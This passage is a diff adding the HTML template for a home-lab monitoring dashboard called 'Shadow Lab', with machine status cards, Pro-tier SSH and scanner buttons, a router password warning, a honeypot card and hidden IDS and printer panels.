@@ -1,0 +1,3782 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shadow Lab</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg:      #0d1117;
+  --card:    #161b22;
+  --header:  #21262d;
+  --border:  #30363d;
+  --text:    #c9d1d9;
+  --muted:   #8b949e;
+  --green:   #3fb950;
+  --yellow:  #d29922;
+  --orange:  #f0883e;
+  --red:     #f85149;
+  --blue:    #58a6ff;
+  --purple:  #bc8cff;
+  --accent:  #8b5cf6;
+}
+/* Pro lock */
+.btn-locked{background:transparent;border:1px solid #30363d;color:#8b949e;font-size:.7rem;padding:2px 9px;border-radius:4px;cursor:default;opacity:.6;}
+.pro-gate{position:relative;}
+.pro-gate::after{content:'PRO';position:absolute;top:-5px;right:-5px;background:#8b5cf6;color:#fff;font-size:.48rem;padding:1px 4px;border-radius:3px;letter-spacing:1px;font-weight:700;}
+/* Tier badges */
+.tier-badge-free{background:#30363d;color:#8b949e;font-size:.6rem;padding:2px 7px;border-radius:4px;letter-spacing:1px;font-weight:700;}
+.tier-badge-pro{background:#8b5cf622;border:1px solid #8b5cf6;color:#a78bfa;font-size:.6rem;padding:2px 7px;border-radius:4px;letter-spacing:1px;font-weight:700;}
+/* Upgrade prompt */
+.upgrade-bar{background:#8b5cf611;border:1px solid #8b5cf644;border-radius:8px;padding:10px 16px;display:flex;align-items:center;justify-content:space-between;gap:12px;margin:8px 12px 0;font-size:.78rem;color:#a78bfa;}
+.upgrade-bar a{background:#7c3aed;color:#fff;border:none;border-radius:5px;padding:4px 14px;cursor:pointer;font-size:.75rem;font-weight:600;text-decoration:none;white-space:nowrap;}
+body.light {
+  --bg:     #f4f6f8;
+  --card:   #ffffff;
+  --header: #e8ecf0;
+  --border: #d0d7de;
+  --text:   #1f2328;
+  --muted:  #656d76;
+  --green:  #1a7f37;
+  --yellow: #9a6700;
+  --orange: #bc4c00;
+  --red:    #cf222e;
+  --blue:   #0969da;
+  --purple: #8250df;
+}
+body.light .progress { background: #d0d7de; }
+*{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'Consolas','Monaco',monospace;min-height:100vh;}
+
+/* Navbar */
+.navbar{background:var(--card)!important;border-bottom:1px solid var(--border);padding:5px 20px;}
+.nox-brand{color:var(--accent);font-weight:700;font-size:1.2rem;letter-spacing:3px;}
+.nox-brand span{color:#a78bfa;}
+
+/* Cards */
+.machine-card{background:var(--card);border:1px solid var(--border);border-radius:10px;transition:border-color .2s,box-shadow .2s;overflow:hidden;}
+.machine-card:hover{border-color:var(--blue);box-shadow:0 0 15px #58a6ff18;}
+.card-head{background:var(--header);border-bottom:1px solid var(--border);padding:7px 14px;display:flex;justify-content:space-between;align-items:center;}
+.machine-label{font-size:.95rem;font-weight:700;color:var(--blue);}
+.machine-host{font-size:.7rem;color:var(--muted);}
+
+/* Status dot */
+.dot{width:9px;height:9px;border-radius:50%;display:inline-block;margin-right:6px;flex-shrink:0;}
+.dot-on{background:var(--green);box-shadow:0 0 8px var(--green);}
+.dot-off{background:var(--red);}
+
+/* Badge */
+.badge-on{background:var(--green);color:#000;font-size:.65rem;padding:2px 7px;border-radius:4px;}
+.badge-off{background:var(--red);color:#fff;font-size:.65rem;padding:2px 7px;border-radius:4px;}
+
+/* Card body */
+.card-body{padding:9px 14px;position:relative;}
+
+/* Offline overlay */
+.offline-overlay{position:absolute;inset:0;background:#0d111799;display:flex;align-items:center;justify-content:center;font-size:1.1rem;color:var(--red);border-radius:0 0 10px 10px;z-index:10;}
+
+/* Stat rows */
+.stat-row{margin-bottom:4px;}
+.stat-label{font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;}
+.stat-val{font-size:.75rem;color:var(--text);}
+.progress{background:#21262d;height:5px;border-radius:3px;margin-top:3px;margin-bottom:2px;}
+.pb-green{background:var(--green);}
+.pb-yellow{background:var(--yellow);}
+.pb-orange{background:var(--orange);}
+.pb-red{background:var(--red);}
+
+/* Net */
+.net-up{color:var(--orange);}
+.net-down{color:var(--blue);}
+
+/* Temp chips */
+.temp-chip{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.68rem;margin:2px 2px 0 0;}
+
+/* SSH button */
+.btn-ssh{background:transparent;border:1px solid var(--green);color:var(--green);font-size:.7rem;padding:2px 9px;border-radius:4px;cursor:pointer;transition:.15s;}
+.btn-ssh:hover{background:var(--green);color:#000;}
+
+/* Alert */
+.machine-card.alert-active{border-color:var(--red)!important;animation:alert-pulse 1.5s infinite;}
+@keyframes alert-pulse{0%,100%{box-shadow:0 0 0 0 #f8514940;}50%{box-shadow:0 0 12px 4px #f8514960;}}
+.alert-bar{background:#f8514918;border-top:1px solid var(--red);padding:4px 10px;font-size:.68rem;color:var(--red);display:flex;align-items:center;gap:6px;flex-wrap:wrap;}
+#alert-banner{position:fixed;top:48px;left:0;right:0;z-index:999;display:none;}
+.banner-item{background:#f85149ee;color:#fff;padding:6px 16px;font-size:.78rem;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #c0392b;}
+.banner-item button{background:transparent;border:none;color:#fff;cursor:pointer;font-size:.9rem;opacity:.7;}
+.banner-item button:hover{opacity:1;}
+
+/* Printer */
+.toner-bar{height:10px;border-radius:5px;background:var(--header);overflow:hidden;margin-top:3px;}
+.toner-fill{height:100%;border-radius:5px;transition:width .4s ease;}
+.toner-ok{background:linear-gradient(90deg,var(--green),var(--blue));}
+.toner-low{background:var(--yellow);}
+.toner-crit{background:var(--red);}
+
+/* Info row (hostname / uptime) */
+.info-row{font-size:.68rem;color:var(--muted);margin-bottom:5px;display:flex;justify-content:space-between;}
+
+/* Footer */
+footer{text-align:center;padding:5px;font-size:.7rem;color:var(--muted);}
+
+/* WS badge */
+#ws-badge{font-size:.7rem;padding:3px 10px;border-radius:4px;}
+#last-upd{font-size:.72rem;color:var(--muted);}
+
+/* Terminal modal */
+.modal-content{background:var(--card);border:1px solid var(--border);}
+.modal-header{border-bottom:1px solid var(--border);padding:8px 16px;}
+.modal-title{color:var(--green);font-size:.9rem;}
+.modal-body{padding:6px;}
+#term-wrap{background:#000;border-radius:4px;padding:4px;}
+
+/* ── Mobil optimalizálás ── */
+@media (max-width: 768px) {
+  .navbar { padding: 6px 12px; flex-wrap: wrap; gap: 6px; }
+  .nox-brand { font-size: 1rem; }
+  #nav-tools { display: none; }
+  #nav-tools.open { display: flex !important; flex-wrap: wrap; width: 100%; gap: 6px; padding: 6px 0; }
+  #hamburger { display: flex !important; }
+  .machine-card .card-head { flex-wrap: wrap; gap: 4px; }
+  .machine-card .card-head > div:last-child { flex-direction: row !important; }
+  .stat-row canvas { height: 55px !important; }
+  .modal-dialog { margin: 8px; max-width: calc(100vw - 16px); }
+  #cmd-output, #log-output, #scan-output { height: 300px !important; }
+  #net-map { height: 350px !important; }
+}
+@media (min-width: 769px) {
+  #hamburger { display: none !important; }
+}
+
+/* ── Tab navigáció ── */
+.tab-bar{background:var(--card);border-bottom:1px solid var(--border);display:flex;gap:2px;padding:0 12px;overflow-x:auto;scrollbar-width:none;}
+.tab-bar::-webkit-scrollbar{display:none;}
+.tab-btn{background:transparent;border:none;border-bottom:3px solid transparent;color:var(--muted);padding:9px 18px;cursor:pointer;font-size:.82rem;font-family:inherit;white-space:nowrap;transition:.15s;}
+.tab-btn:hover{color:var(--text);}
+.tab-btn.active{color:var(--blue);border-bottom-color:var(--blue);font-weight:600;}
+.tab-pane{display:none;}
+.tab-pane.active{display:block;}
+
+/* ── Vezérlés / Services ── */
+.svc-row{display:flex;align-items:center;padding:5px 12px;border-bottom:1px solid #30363d22;font-size:.75rem;}
+.svc-row:hover{background:#30363d22;}
+.svc-name{flex:1;color:var(--text);font-family:Consolas,monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px;}
+.svc-active{color:var(--green);}.svc-failed{color:var(--red);}.svc-inactive{color:var(--muted);}
+.btn-act{background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:3px;padding:1px 8px;cursor:pointer;font-size:.65rem;transition:.1s;}
+.btn-act:hover{border-color:var(--green);color:var(--green);}
+.btn-act.stop:hover{border-color:var(--red);color:var(--red);}
+.btn-act.rst:hover{border-color:var(--orange);color:var(--orange);}
+
+/* ── Fájlböngésző ── */
+.file-row{display:flex;align-items:center;padding:5px 12px;border-bottom:1px solid #30363d18;font-size:.78rem;cursor:pointer;}
+.file-row:hover{background:#30363d30;}
+.file-name{flex:1;color:var(--text);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.file-size{color:var(--muted);font-size:.68rem;min-width:72px;text-align:right;margin-right:10px;}
+.file-date{color:var(--muted);font-size:.65rem;min-width:110px;text-align:right;margin-right:8px;}
+.bc-sep{color:var(--muted);margin:0 2px;}
+.bc-part{color:var(--blue);cursor:pointer;}
+.bc-part:hover{text-decoration:underline;}
+
+/* ── Ping mátrix ── */
+.pm-table th,.pm-table td{padding:6px 14px;font-size:.74rem;text-align:center;border-bottom:1px solid #30363d22;}
+.pm-table th{color:var(--muted);font-weight:normal;background:var(--header);}
+.pm-ok{color:var(--green);font-weight:700;}.pm-warn{color:var(--yellow);font-weight:700;}.pm-fail{color:var(--red);}
+
+/* ── Tailscale ── */
+.ts-peer{display:flex;align-items:center;gap:10px;padding:7px 12px;border-bottom:1px solid #30363d18;font-size:.75rem;}
+.ts-peer:hover{background:#30363d20;}
+
+/* ── Jegyzetek ── */
+.note-item{padding:8px 12px;cursor:pointer;border-bottom:1px solid var(--border);font-size:.78rem;}
+.note-item:hover{background:var(--header);}
+.note-item.active{background:#58a6ff15;border-left:3px solid var(--blue);padding-left:9px;}
+#note-editor{width:100%;resize:none;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:6px;padding:12px;font-family:Consolas,Monaco,monospace;font-size:.82rem;line-height:1.65;outline:none;}
+#note-editor:focus{border-color:var(--blue);}
+
+/* ── Section label ── */
+.slabel{font-size:.63rem;color:var(--muted);text-transform:uppercase;letter-spacing:1px;margin-bottom:6px;}
+
+/* ── Camera cards ── */
+.cam-card{background:var(--card);border:1px solid var(--border);border-radius:8px;overflow:hidden;position:relative;}
+.cam-card-head{display:flex;align-items:center;justify-content:space-between;padding:7px 12px;background:var(--header);border-bottom:1px solid var(--border);}
+.cam-card-label{font-size:.80rem;font-weight:600;color:var(--text);}
+.cam-card-ip{font-size:.70rem;color:var(--muted);}
+.cam-card-body{position:relative;background:#000;min-height:200px;display:flex;align-items:center;justify-content:center;}
+.cam-card-body img{width:100%;height:auto;display:block;max-height:360px;object-fit:contain;}
+.cam-offline{color:var(--muted);font-size:.80rem;text-align:center;padding:40px 20px;}
+.cam-badge{position:absolute;top:6px;right:8px;font-size:.65rem;padding:2px 7px;border-radius:10px;font-weight:600;}
+.cam-badge.live{background:#16a34a33;color:#4ade80;border:1px solid #16a34a55;}
+.cam-badge.offline{background:#dc262633;color:#f87171;border:1px solid #dc262655;}
+.cam-badge.notoken{background:#92400e33;color:#fbbf24;border:1px solid #92400e55;}
+.cam-footer{padding:5px 12px;display:flex;gap:8px;align-items:center;font-size:.72rem;color:var(--muted);}
+</style>
+</head>
+<body>
+
+<nav class="navbar d-flex justify-content-between align-items-center" style="flex-wrap:wrap;">
+  <div class="d-flex align-items-center gap-2">
+    <span class="nox-brand">◈ <span>SHADOW</span> LAB</span>
+    <span id="ws-badge" style="background:#30363d;color:#8b949e;font-size:.7rem;padding:2px 8px;border-radius:4px;">Connecting...</span>
+    <span id="last-upd" style="font-size:.7rem;color:var(--muted);">—</span>
+  </div>
+  <button id="hamburger" onclick="document.getElementById('nav-tools').classList.toggle('open')"
+    style="background:transparent;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:1rem;">☰</button>
+  <div id="nav-tools" class="d-flex align-items-center gap-2">
+    <!-- Add Machine -->
+    <button onclick="openAddMachine()" title="Add machine" style="background:var(--accent);border:none;color:#fff;border-radius:6px;padding:4px 11px;cursor:pointer;font-size:.82rem;font-weight:600;">+ Machine</button>
+    <button onclick="openManageMachines()" title="Manage machines" style="background:transparent;border:1px solid var(--accent);color:var(--accent);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.82rem;">⚙</button>
+    <!-- Pro: Scanner -->
+    {% if is_pro %}
+    <button onclick="openScanner()" title="Port scanner" style="background:transparent;border:1px solid var(--red);color:var(--red);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">🌐</button>
+    <button onclick="openLogs()" title="Log viewer" style="background:transparent;border:1px solid var(--yellow);color:var(--yellow);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">📄</button>
+    <button onclick="openCmds()" title="Quick commands" style="background:transparent;border:1px solid var(--green);color:var(--green);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">⚡</button>
+    {% else %}
+    <button onclick="showUpgrade()" title="Pro feature" class="pro-gate" style="background:transparent;border:1px solid #30363d;color:#8b949e;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">🌐</button>
+    <button onclick="showUpgrade()" title="Pro feature" class="pro-gate" style="background:transparent;border:1px solid #30363d;color:#8b949e;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">📄</button>
+    <button onclick="showUpgrade()" title="Pro feature" class="pro-gate" style="background:transparent;border:1px solid #30363d;color:#8b949e;border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">⚡</button>
+    {% endif %}
+    <button onclick="openNetMap()" title="Network map" style="background:transparent;border:1px solid var(--blue);color:var(--blue);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">🗺️</button>
+    <button onclick="location.reload()" title="Refresh" style="background:transparent;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">🔄</button>
+    <button id="theme-btn" onclick="toggleTheme()" title="Theme" style="background:transparent;border:1px solid var(--border);color:var(--text);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;">🌙</button>
+    <!-- User info -->
+    <span style="font-size:.72rem;color:var(--muted);padding:0 4px;">{{ user.username }}</span>
+    {% if is_pro %}
+    <span class="tier-badge-pro">PRO</span>
+    {% else %}
+    <span class="tier-badge-free">FREE</span>
+    {% endif %}
+    <a href="/logout" title="Logout" style="background:transparent;border:1px solid var(--red);color:var(--red);border-radius:6px;padding:4px 10px;cursor:pointer;font-size:.85rem;text-decoration:none;">⏻</a>
+  </div>
+</nav>
+
+<div id="alert-banner"></div>
+
+<!-- Tab sáv -->
+<div class="tab-bar">
+  <button class="tab-btn active" onclick="switchTab('monitor',this)">🖥️ Monitor</button>
+  {% if is_pro %}
+  <button class="tab-btn" onclick="switchTab('control',this)">⚙️ Control</button>
+  <button class="tab-btn" onclick="switchTab('files',this)">📁 Files</button>
+  {% else %}
+  <button class="tab-btn" onclick="showUpgrade()" style="opacity:.55;" title="Pro feature">⚙️ Control 🔒</button>
+  <button class="tab-btn" onclick="showUpgrade()" style="opacity:.55;" title="Pro feature">📁 Files 🔒</button>
+  {% endif %}
+  <button class="tab-btn" onclick="switchTab('network',this)">🌐 Network</button>
+  <button class="tab-btn" onclick="switchTab('notes',this)">📝 Notes</button>
+</div>
+
+{% if not is_pro %}
+<div class="upgrade-bar">
+  <span>🔒 <strong>Pro</strong> features: SSH terminal, nmap scanner, process manager, file browser, WoL</span>
+  <a href="#" onclick="showUpgrade();return false;">Upgrade to Pro →</a>
+</div>
+{% endif %}
+
+<!-- ══ TAB: Monitor ══ -->
+<div id="tab-monitor" class="tab-pane active">
+<div class="container-fluid px-3 py-2">
+  <div class="row g-3">
+    {% for mid, m in machines.items() %}
+    {% if m.get('type') != 'router' %}
+    <div class="col-xl-3 col-lg-6 col-md-6">
+      <div class="machine-card h-100" id="card-{{mid}}">
+        <div class="card-head">
+          <div>
+            <div class="machine-label">
+              <span class="dot dot-off" id="dot-{{mid}}"></span>{{m.label}}
+            </div>
+            <div class="machine-host">{{m.host}}</div>
+          </div>
+          <div class="d-flex flex-column align-items-end gap-1">
+            <span class="badge-off" id="badge-{{mid}}">OFFLINE</span>
+            <div class="d-flex gap-1 mt-1">
+            {% if m.get('type') == 'router' %}
+            <a class="btn-ssh" href="{{m.get('web_url','http://'+m.host+'/')}}" target="_blank" title="Router admin felület">
+              <i class="fas fa-network-wired"></i> Admin
+            </a>
+            {% elif m.get('type') == 'honeypot' %}
+            <a class="btn-ssh" href="rdp://{{m.host}}" title="RDP kapcsolat" style="border-color:var(--red);color:var(--red);">
+              <i class="fas fa-desktop"></i> RDP
+            </a>
+            {% else %}
+            {% if not m.get('local', False) %}
+              {% if is_pro %}
+              <button class="btn-ssh" onclick="openTerm('{{mid}}','{{m.label}}')">
+                <i class="fas fa-terminal"></i> SSH
+              </button>
+              {% else %}
+              <button class="btn-locked pro-gate" onclick="showUpgrade()" title="Pro feature">
+                <i class="fas fa-terminal"></i> SSH
+              </button>
+              {% endif %}
+            {% endif %}
+            {% if is_pro %}
+            <button class="btn-ssh" style="border-color:var(--purple);color:var(--purple);" onclick="openScreenshot('{{mid}}','{{m.label}}')">
+              <i class="fas fa-desktop"></i>
+            </button>
+            <button class="btn-ssh" style="border-color:var(--orange);color:var(--orange);" onclick="openProcs('{{mid}}','{{m.label}}')">
+              <i class="fas fa-microchip"></i>
+            </button>
+            {% else %}
+            <button class="btn-locked pro-gate" onclick="showUpgrade()" title="Pro feature">
+              <i class="fas fa-desktop"></i>
+            </button>
+            <button class="btn-locked pro-gate" onclick="showUpgrade()" title="Pro feature">
+              <i class="fas fa-microchip"></i>
+            </button>
+            {% endif %}
+            {% endif %}
+            </div>
+          </div>
+        </div>
+        <div class="card-body">
+          <div class="offline-overlay" id="ov-{{mid}}">
+            <i class="fas fa-circle-xmark me-2"></i>OFFLINE
+          </div>
+
+          {% if m.get('type') == 'router' %}
+          <!-- Router kártya -->
+          <div class="stat-row" style="margin-top:4px;">
+            <div class="d-flex justify-content-between align-items-center mb-2">
+              <span class="stat-label">PING LATENCIA</span>
+              <span class="stat-val" id="rtr-lat-{{mid}}" style="font-size:1.1rem;font-weight:700;color:var(--green)">— ms</span>
+            </div>
+          </div>
+          <div class="stat-row">
+            <div class="d-flex flex-column gap-2" style="font-size:.72rem;">
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-microchip me-1"></i>Modell</span>
+                <span id="rtr-fw-{{mid}}" style="color:var(--text)">—</span>
+              </div>
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-globe me-1"></i>Gateway</span>
+                <span style="color:var(--blue)">{{m.host}}</span>
+              </div>
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-wifi me-1"></i>Típus</span>
+                <span style="color:var(--text)">TP-Link 300Mbps</span>
+              </div>
+            </div>
+          </div>
+          <div id="rtr-warn-{{mid}}" style="display:none;background:#f8514918;border:1px solid var(--red);border-radius:6px;padding:6px 10px;margin-top:8px;font-size:.72rem;color:var(--red);">
+            <i class="fas fa-triangle-exclamation me-1"></i><strong>Nincs jelszó beállítva!</strong> A router bárki számára elérhető.
+          </div>
+          <div class="stat-row" style="margin-top:12px;margin-bottom:0;">
+            <div style="background:var(--header);border-radius:6px;padding:8px 10px;text-align:center;">
+              <a href="{{m.get('web_url','http://'+m.host+'/')}}" target="_blank"
+                 style="color:var(--blue);font-size:.75rem;text-decoration:none;">
+                <i class="fas fa-external-link-alt me-1"></i>Megnyitás: {{m.host}}
+              </a>
+            </div>
+          </div>
+
+          {% elif m.get('type') == 'honeypot' %}
+          <!-- Honeypot kártya -->
+          <div class="stat-row" style="margin-top:4px;">
+            <div class="d-flex justify-content-between align-items-center mb-2">
+              <span class="stat-label">RDP LATENCIA</span>
+              <span class="stat-val" id="hp-lat-{{mid}}" style="font-size:1.1rem;font-weight:700;color:var(--green)">— ms</span>
+            </div>
+          </div>
+          <div class="stat-row">
+            <div class="d-flex flex-column gap-2" style="font-size:.72rem;">
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-desktop me-1"></i>RDP</span>
+                <span style="color:var(--blue)">{{m.host}}:{{m.get('rdp_port',3389)}}</span>
+              </div>
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-user me-1"></i>Felhasználó</span>
+                <span style="color:var(--text)">{{m.get('rdp_user','Dorothy')}} / {{m.get('rdp_pass','1234')}}</span>
+              </div>
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-plug me-1"></i>AnyDesk ID</span>
+                <span style="color:var(--purple)">{{m.get('anydesk_id','—')}} / {{m.get('anydesk_pass','—')}}</span>
+              </div>
+              <div class="d-flex justify-content-between">
+                <span style="color:var(--muted)"><i class="fas fa-network-wired me-1"></i>IP</span>
+                <span style="color:var(--text)">{{m.host}}</span>
+              </div>
+            </div>
+          </div>
+          <!-- DOROTHY honeypot alert szekció -->
+          <div style="margin-top:8px;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:4px;">
+              <span style="font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:.05em;">
+                <i class="fas fa-skull-crossbones me-1" style="color:var(--red);"></i>Kapcsolatok (24h)
+              </span>
+              <span id="hp-total-{{mid}}" style="font-size:.75rem;font-weight:700;color:var(--red);">0</span>
+            </div>
+            <div id="hp-alert-list-{{mid}}" style="max-height:120px;overflow-y:auto;display:flex;flex-direction:column;gap:2px;">
+              <div style="font-size:.65rem;color:var(--muted);text-align:center;padding:6px 0;">
+                <i class="fas fa-shield-check me-1"></i>Nincs kapcsolat
+              </div>
+            </div>
+          </div>
+
+          {% else %}
+          <!-- Normál gép kártya -->
+          <div class="alert-bar" id="alert-bar-{{mid}}" style="display:none;margin:-12px -14px 10px -14px;border-radius:0;">
+            <i class="fas fa-triangle-exclamation"></i>
+            <span id="alert-txt-{{mid}}"></span>
+          </div>
+
+          <div class="info-row">
+            <span id="hn-{{mid}}">—</span>
+            <span id="up-{{mid}}">—</span>
+          </div>
+
+          <!-- CPU -->
+          <div class="stat-row">
+            <div class="d-flex justify-content-between">
+              <span class="stat-label">CPU</span>
+              <span class="stat-val" id="cpu-v-{{mid}}">—%</span>
+            </div>
+            <div class="progress"><div class="progress-bar" id="cpu-b-{{mid}}" style="width:0%"></div></div>
+            <span class="stat-val" id="load-{{mid}}" style="font-size:.65rem;color:var(--muted)">load —</span>
+          </div>
+
+          <!-- RAM -->
+          <div class="stat-row">
+            <div class="d-flex justify-content-between">
+              <span class="stat-label">RAM</span>
+              <span class="stat-val" id="ram-v-{{mid}}">—%</span>
+            </div>
+            <div class="progress"><div class="progress-bar" id="ram-b-{{mid}}" style="width:0%"></div></div>
+            <span class="stat-val" id="ram-d-{{mid}}" style="font-size:.65rem;color:var(--muted)">— / —</span>
+          </div>
+
+          <!-- DISK -->
+          <div class="stat-row">
+            <div class="d-flex justify-content-between">
+              <span class="stat-label">DISK</span>
+              <span class="stat-val" id="disk-v-{{mid}}">—%</span>
+            </div>
+            <div class="progress"><div class="progress-bar" id="disk-b-{{mid}}" style="width:0%"></div></div>
+            <span class="stat-val" id="disk-d-{{mid}}" style="font-size:.65rem;color:var(--muted)">— / —</span>
+          </div>
+
+          <!-- NET -->
+          <div class="stat-row">
+            <span class="stat-label">NETWORK</span>
+            <div class="d-flex gap-3 mt-1">
+              <span style="font-size:.78rem" class="net-up">↑ <span id="nu-{{mid}}">—</span></span>
+              <span style="font-size:.78rem" class="net-down">↓ <span id="nd-{{mid}}">—</span></span>
+            </div>
+          </div>
+
+          <!-- TEMP -->
+          <div class="stat-row">
+            <span class="stat-label">TEMPERATURE</span>
+            <div class="mt-1" id="temp-{{mid}}"><span style="font-size:.68rem;color:var(--muted)">—</span></div>
+          </div>
+
+          <!-- GPU (hidden if N/A) -->
+          <div class="stat-row" id="gpu-s-{{mid}}" style="display:none">
+            <span class="stat-label">GPU</span>
+            <div class="d-flex gap-3 mt-1" style="font-size:.78rem">
+              <span><span id="gpu-u-{{mid}}">—</span>% util</span>
+              <span style="color:var(--orange)"><span id="gpu-t-{{mid}}">—</span>°C</span>
+              <span class="text-muted"><span id="gpu-m-{{mid}}">—</span></span>
+            </div>
+          </div>
+
+          <!-- Grafikon -->
+          <div class="stat-row" style="margin-bottom:0;">
+            <div class="d-flex justify-content-between align-items-center">
+              <span class="stat-label">HISTORY</span>
+              <span style="font-size:.6rem;color:var(--muted)">
+                <span style="color:#58a6ff">■</span> CPU &nbsp;
+                <span style="color:#f0883e">■</span> RAM
+              </span>
+            </div>
+            <div style="height:52px;margin-top:2px;">
+              <canvas id="chart-{{mid}}"></canvas>
+            </div>
+          </div>
+          {% endif %}
+        </div>
+      </div>
+    </div>
+    {% endif %}
+    {% endfor %}
+  </div>
+  {% if not machines %}
+  <div id="empty-state" style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:calc(100vh - 180px);gap:16px;color:var(--muted);">
+    <div style="font-size:3rem;opacity:.3;">◈</div>
+    <div style="font-size:1.1rem;font-weight:600;color:var(--fg);">No machines yet</div>
+    <div style="font-size:.85rem;text-align:center;max-width:320px;line-height:1.6;">Add your first machine to start monitoring CPU, RAM, disk and network stats in real time.</div>
+    <button onclick="openAddMachine()" style="margin-top:8px;background:var(--purple,#7c3aed);border:none;border-radius:6px;color:#fff;padding:9px 20px;font-family:inherit;font-size:.9rem;font-weight:600;cursor:pointer;letter-spacing:1px;">+ Add Machine</button>
+  </div>
+  {% endif %}
+</div>
+
+<!-- IDS_REMOVED -->
+<div class="container-fluid px-3 pb-2" style="display:none">
+  <div class="machine-card" id="ids-card" style="border-color:var(--red)44;">
+    <div class="card-head">
+      <div>
+        <div class="machine-label">
+          <span class="dot" id="ids-dot" style="background:var(--muted);"></span>
+          🛡️ IDS / Suricata
+          <span id="ids-running" style="font-size:.72rem;color:var(--muted);margin-left:6px;">—</span>
+        </div>
+        <div class="machine-host" id="ids-last-upd" style="font-size:.7rem;">—</div>
+      </div>
+      <div style="display:flex;gap:8px;align-items:center;">
+        <span id="ids-wazuh-badge" style="font-size:.7rem;color:var(--blue);">Wazuh: —</span>
+        <span id="ids-total-badge" class="badge-off" style="font-size:.7rem;">— alert</span>
+      </div>
+    </div>
+    <div id="ids-body" style="padding:6px 12px 8px;display:flex;gap:24px;flex-wrap:wrap;align-items:flex-start;">
+      <div style="display:flex;gap:16px;">
+        <div style="text-align:center;">
+          <div id="ids-critical" style="font-size:1.4rem;font-weight:700;color:var(--red);">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">Kritikus</div>
+        </div>
+        <div style="text-align:center;">
+          <div id="ids-high" style="font-size:1.4rem;font-weight:700;color:var(--orange);">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">Magas</div>
+        </div>
+        <div style="text-align:center;">
+          <div id="ids-medium" style="font-size:1.4rem;font-weight:700;color:var(--yellow);">—</div>
+          <div style="font-size:.68rem;color:var(--muted);">Közepes</div>
+        </div>
+      </div>
+      <div id="ids-top-sigs" style="flex:1;min-width:200px;font-size:.75rem;color:var(--muted);">—</div>
+    </div>
+  </div>
+</div>
+
+<!-- PRINTER_REMOVED -->
+<div class="container-fluid px-3 pb-2" style="display:none">
+  <div class="machine-card" id="printer-card" style="border-color:var(--orange)44;">
+    <div class="card-head">
+      <div>
+        <div class="machine-label">
+          <span class="dot dot-off" id="printer-dot"></span>🖨️ HP LaserJet Pro MFP M26nw
+        </div>
+        <div class="machine-host">192.168.0.118</div>
+      </div>
+      <div class="d-flex align-items-center gap-2">
+        <span id="printer-badge" class="badge-off">OFFLINE</span>
+        <button class="btn-ssh" style="border-color:var(--orange);color:var(--orange);" onclick="openPrinter()">
+          <i class="fas fa-print"></i> Nyomtatás
+        </button>
+      </div>
+    </div>
+    <div class="card-body py-2">
+      <div class="row align-items-center g-3">
+        <div class="col-md-4">
+          <div class="stat-label mb-1">TONER — <span id="printer-toner-name" style="color:var(--muted);font-weight:normal;">—</span></div>
+          <div class="d-flex align-items-center gap-2">
+            <div class="toner-bar flex-grow-1">
+              <div class="toner-fill toner-ok" id="printer-toner-bar" style="width:0%"></div>
+            </div>
+            <span class="stat-val" id="printer-toner-pct" style="min-width:36px;text-align:right;">—%</span>
+          </div>
+        </div>
+        <div class="col-md-3">
+          <div class="stat-label mb-1">ÁLLAPOT</div>
+          <span id="printer-status-text" style="font-size:.78rem;color:var(--muted);">—</span>
+        </div>
+        <div class="col-md-3">
+          <div class="stat-label mb-1">NYOMTATÁSI SOR</div>
+          <span id="printer-job-count" style="font-size:.78rem;color:var(--text);">— feladat</span>
+        </div>
+        <div class="col-md-2 text-end">
+          <button onclick="openPrinter()"
+            style="background:var(--orange);border:none;color:#000;border-radius:6px;padding:5px 14px;cursor:pointer;font-size:.78rem;font-weight:600;width:100%;">
+            <i class="fas fa-print me-1"></i>Megnyitás
+          </button>
+        </div>
+      </div>
+      <div id="printer-job-list" style="margin-top:6px;display:none;"></div>
+    </div>
+  </div>
+</div>
+
+<!-- RADAR_REMOVED -->
+<div class="container-fluid px-3 pb-2" style="display:none">
+  <div class="machine-card" id="radar-card" style="border-color:var(--blue)44;">
+    <div class="card-head">
+      <div>
+        <div class="machine-label">
+          <span class="dot dot-off" id="radar-dot"></span>📡 WiFi Radar
